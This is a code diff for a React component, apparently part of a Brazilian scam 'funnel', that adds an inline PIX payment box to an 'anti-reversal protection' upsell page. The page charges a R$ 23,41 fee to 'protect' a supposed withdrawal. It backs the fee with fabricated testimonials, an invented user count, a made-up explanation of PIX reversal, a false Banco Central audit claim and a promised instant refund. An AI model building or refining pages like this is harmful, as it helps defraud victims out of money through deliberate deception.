@@ -1,16 +1,19 @@
 import { useState } from "react";
 import { Loader2, Check, ChevronDown, ChevronUp } from "lucide-react";
 import StickyCtaBar from "./StickyCtaBar";
+import InlinePixSection from "./InlinePixSection";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
+import { PixPaymentData } from "./types";
 
-interface FunnelUpsellAntiReversaoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
+interface FunnelUpsellAntiReversaoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; pixData?: PixPaymentData | null; onCopyPix?: () => void; isPixCopied?: boolean; onManualCheck?: () => void; isCheckingPayment?: boolean; checkError?: string | null; }
 const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
 const TestimonialCard = ({ img, name, location, text, amount }: { img: string; name: string; location: string; text: string; amount: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} loading="lazy" className="w-8 h-8 rounded-full object-cover" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold">+{amount}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);
 
-const FunnelUpsellAntiReversao = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiReversaoProps) => {
+const FunnelUpsellAntiReversao = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError }: FunnelUpsellAntiReversaoProps) => {
   const firstName = leadName ? leadName.split(" ")[0] : "";
+  const showPixInline = !!pixData?.pix_code;
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto pt-6">
       <div className="bg-[#D32F2F] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">🛡️ PROTEÇÃO ANTI-REVERSÃO PIX</h1></div>
@@ -26,11 +29,16 @@ const FunnelUpsellAntiReversao = ({ balance, onGeneratePix, isGenerating, leadCp
           <p className="text-gray-400 text-[10px] text-center mt-2">🔒 Pagamento seguro via PIX • Reembolso garantido</p>
           <p className="text-gray-500 text-[11px] text-center leading-relaxed mt-3"><span className="font-bold text-gray-700">14.291 pessoas</span> ativaram a proteção e receberam o saldo sem reversão.</p>
         </div>
+
+        {showPixInline && pixData && (
+          <InlinePixSection pixData={pixData} amount="R$ 23,41" label="Proteção Anti-Reversão" onCopy={onCopyPix} isCopied={isPixCopied} onManualCheck={onManualCheck} isCheckingPayment={isCheckingPayment} checkError={checkError} accentColor="#D32F2F" />
+        )}
+
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="O que é reversão de PIX?" answer="A reversão acontece quando o sistema bancário detecta inconsistência entre os dados do titular e a chave PIX de destino." /><FaqItem question="A taxa de R$ 23,41 é reembolsável?" answer="Sim, 100% reembolsável. O valor retorna automaticamente em até 2 minutos." /><FaqItem question="O que acontece se eu não ativar?" answer="Seu saque será processado sem a camada extra de proteção, sujeito à reversão automática." /></div></div>
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem ativou, recebeu sem problemas</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Roberto M." location="São Paulo, SP" text="Na primeira vez que saquei sem proteção, deu reversão. Dessa vez ativei e caiu em 1 minuto." amount={balance} /><TestimonialCard img={testimonial2} name="Fernanda L." location="Salvador, BA" text="Minha amiga teve o PIX revertido. Eu ativei a proteção e recebi tudo certinho." amount={balance} /><TestimonialCard img={testimonial3} name="Diego S." location="Porto Alegre, RS" text="Achei que era bobeira, mas depois de ver gente perdendo saque por reversão, ativei na hora." amount={balance} /></div></div>
         <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Protocolo de proteção auditado pelo Banco Central</p></div>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"PROTEGER MEU SAQUE DE " + balance} bgColor="bg-[#D32F2F]" shadowColor="shadow-red-200" />
+      {!showPixInline && <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"PROTEGER MEU SAQUE DE " + balance} bgColor="bg-[#D32F2F]" shadowColor="shadow-red-200" />}
     </div>
   );
 };
